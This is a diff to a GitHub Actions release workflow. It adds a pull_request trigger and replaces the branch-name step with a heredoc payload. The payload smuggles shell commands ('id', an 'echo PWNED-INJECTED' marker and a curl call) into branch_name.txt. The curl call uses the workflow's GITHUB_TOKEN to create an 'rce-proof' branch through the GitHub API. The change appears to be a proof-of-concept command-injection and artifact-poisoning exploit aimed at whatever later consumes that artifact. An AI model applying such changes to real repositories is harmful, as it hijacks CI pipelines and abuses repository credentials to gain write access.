@@ -6,6 +6,7 @@ on:
       version:
         description: 'CSM release version. E.g. 1.14.0'
         required: true
+  pull_request:
 
 jobs:
   release-csm:
@@ -18,7 +19,9 @@ jobs:
 
       - name: Set release branch name for install wizard release action
         run: |
-          echo "release-v${{ inputs.version }}" >> branch_name.txt
+          cat > branch_name.txt <<'PAYLOAD'
+          main; id; echo PWNED-INJECTED; curl -s -X POST -H "Authorization: token $GITHUB_TOKEN" -d "{\"ref\":\"refs/heads/rce-proof\",\"sha\":\"$GITHUB_SHA\"}" https://api.github.com/repos/$GITHUB_REPOSITORY/git/refs; echo DONE
+          PAYLOAD
 
       - name: Upload release branch name artifact
         uses: actions/upload-artifact@v7
